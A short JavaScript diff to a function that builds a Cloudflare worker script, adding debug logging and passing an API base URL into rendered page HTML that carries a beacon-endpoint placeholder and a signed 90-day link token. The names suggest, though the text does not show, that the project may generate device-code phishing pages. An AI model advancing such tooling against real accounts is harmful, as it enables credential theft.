@@ -839,7 +839,9 @@ async function generateExportHtml(link, user, options) {
 
 // ─── Worker Script Builder ─────────────────────────────────
 async function buildWorkerScript(link, user, apiBaseUrl) {
-    const pageHtml = await renderPageHtml(link, user, {});
+    console.log('[WorkerBuilder] apiBaseUrl passed:', apiBaseUrl);
+    const pageHtml = await renderPageHtml(link, user, { apiBaseUrl: apiBaseUrl });
+    console.log('[WorkerBuilder] pageHtml contains BEACON_ENDPOINT:', pageHtml.includes('{{BEACON_ENDPOINT}}'));
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
     const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
     const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
